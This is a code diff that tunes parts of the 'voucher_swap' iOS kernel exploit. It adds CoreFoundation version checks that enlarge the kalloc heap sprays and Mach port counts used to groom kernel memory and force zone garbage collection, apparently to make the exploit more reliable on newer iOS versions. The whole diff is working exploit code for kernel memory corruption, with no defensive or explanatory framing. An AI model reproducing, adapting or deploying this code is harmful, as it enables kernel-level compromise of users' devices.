@@ -8,6 +8,7 @@
 #include <mach/mach.h>
 #include <stdlib.h>
 #include <unistd.h>
+#include <CoreFoundation/CoreFoundation.h>
 
 #include "ipc_port.h"
 #include "kernel_alloc.h"
@@ -822,11 +823,11 @@ voucher_swap() {
 
 	// 6. Spray 10% of memory in kalloc.1024 that we can free later to
 	// prompt gc. We'll reuse some of the early ports from the port spray above for this.
-	const size_t gc_spray_size = 0.10 * platform.memory_size;
+    const size_t gc_spray_size = (kCFCoreFoundationVersionNumber >= 1560.00 ? 0.15 : 0.10) * platform.memory_size;
 	printf("Spray size: %ld\n", gc_spray_size);
 	mach_port_t *gc_ports = filler_ports;
 	size_t gc_port_count = 500;		// Use at most 500 ports for the spray.
-	sprayed_size = kalloc_spray_size(gc_ports, &gc_port_count, 300 + 1, 1024, gc_spray_size);;
+    sprayed_size = kalloc_spray_size(gc_ports, &gc_port_count, (kCFCoreFoundationVersionNumber >= 1560.00 ? 768 : 300) + 1, 1024, gc_spray_size);;
 	INFO("sprayed %zu bytes to %zu ports in kalloc.%u", sprayed_size, gc_port_count, 1024);
     
 	// 7. Stash a pointer to an ipc_voucher in the thread's ith_voucher field and then remove
@@ -879,9 +880,9 @@ voucher_swap() {
 	// kalloc.32768 zone. We need to do this slowly in order to force a zone garbage
 	// collection. Spraying 17% of memory (450 MB on the iPhone XR) with OOL ports should be
 	// plenty.
-	const size_t ool_ports_spray_size = 0.085 * platform.memory_size;
+    const size_t ool_ports_spray_size = (kCFCoreFoundationVersionNumber >= 1560.00 ? 0.17 : 0.085) * platform.memory_size;
 	mach_port_t *ool_holding_ports = gc_ports + gc_port_count;
-	size_t ool_holding_port_count = 250;
+	size_t ool_holding_port_count = 500;
 	sprayed_size = ool_ports_spray_size_with_gc(ool_holding_ports, &ool_holding_port_count,
 			message_size_for_kalloc_size(512),
 			ool_ports, ool_port_count, MACH_MSG_TYPE_MAKE_SEND,
